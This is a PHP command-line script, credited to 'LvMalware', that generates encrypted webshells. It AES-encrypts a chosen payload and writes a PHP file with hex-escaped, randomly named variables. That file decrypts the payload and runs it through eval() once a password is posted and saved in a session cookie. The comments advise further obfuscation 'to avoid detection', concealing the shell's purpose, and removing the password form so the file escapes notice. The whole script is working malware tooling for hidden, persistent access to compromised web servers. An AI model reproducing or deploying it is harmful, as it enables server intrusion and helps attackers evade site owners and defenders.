<?php
    if ($argc < 4)
    {
        echo "Usage: create.php <payload_file> <password> <output_file>\n";
        exit;
    }
    echo "Encrypted WebShell generator by LvMalware\n\n";
    echo "[+] Opening payload file... ";
    $file = @fopen($argv[1], "r");
    if (!$file)
        die("[!]\n" . $argv[0] .": Can't open '" . $argv[1] . "' for reading\n");
    echo "[OK]\n[+] Reading payload data... ";
    $payload = fread($file, filesize($argv[1]));
    fclose($file);
    echo "[OK]\n[+] Encrypting payload... ";
    $iv = random_bytes(16);
    /* The payload will be encrypted with AES-256 in CTR mode using the
    openssl_encrypt() function from the OpenSSL extension for PHP >= 5.3.0.
    Older PHP versions could require the use of some other cryptography
    extensions, or even the use of some personalized encryption algorithm.
    */
    $encrypted = openssl_encrypt($payload, "AES-256-CTR", $argv[2], 0, $iv);
    echo "[OK]\n[+] Generating file... ";
    if ($encrypted)
    {
        $iv = base64_encode($iv);
        $var_payload = "_" . bin2hex(random_bytes(11));
        $var_password = "_" . bin2hex(random_bytes(11));
        /*
            Modify the output code if you need it to be more difficult to
         understand (that is, to avoid detection). Note that once a password is
         entered, it will be saved into a session cookie and used to decrypt the
         payload that will then be executed next. This will happen even if the
         password is incorrect, so with the wrong password the user will see
         a lot of errors or just won't see anything as output, thus keeping the
         real purpose of the webshell concealed.
            On the other hand, this method of maintaining access could be used
         to detect the file and even to obtain the password. As an alternative,
         you could remove this part of the code and compensate it with other 
         method coded on the payload to mantain the access after typing the
         correct password the first time.
            Also, the form displayed to enter a password can be removed, so a
         user that only has access to the client-side on the server would not
         be able to spot this as a malicious (even though suspicious) file.
          */
        $outcode = "<?php session_start();\$$var_payload=\"$encrypted\";if(!empty(\$$var_password=\$_POST['$var_password']))\$_SESSION['$var_password']=\$$var_password;if(isset(\$_SESSION['$var_password'])){eval(openssl_decrypt(\$$var_payload,\"\\x41\\x45\\x53\\x2d\\x32\\x35\\x36\\x2d\\x43\\x54\\x52\",\$_SESSION['$var_password'],0,base64_decode(\"$iv\")));}else{echo\"\\x3c\\x66\\x6f\\x72\\x6d\\x20\\x6d\\x65\\x74\\x68\\x6f\\x64\\x3d\\x22\\x50\\x4f\\x53\\x54\\x22\\x3e\\x3c\\x69\\x6e\\x70\\x75\\x74\\x20\\x74\\x79\\x70\\x65\\x3d\\x22\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x22\\x20\\x6e\\x61\\x6d\\x65\\x3d\\x22$var_password\\x22\\x3e\\x3c\\x69\\x6e\\x70\\x75\\x74\\x20\\x74\\x79\\x70\\x65\\x3d\\x22\\x73\\x75\\x62\\x6d\\x69\\x74\\x22\\x20\\x76\\x61\\x6c\\x75\\x65\\x3d\\x22\\x45\\x6e\\x74\\x65\\x72\\x22\\x3e\\x3c\\x2f\\x66\\x6f\\x72\\x6d\\x3e\";}?>";
        $file = fopen($argv[3], "w");
        fwrite($file, $outcode);
        fclose($file);
        echo "[OK]\n[+] File was saved as '" . $argv[3] . "'\n";
    }
    else
    {
        die("[!]\n" . $argv[0] . ": Error while generating file\n");
    }
?>
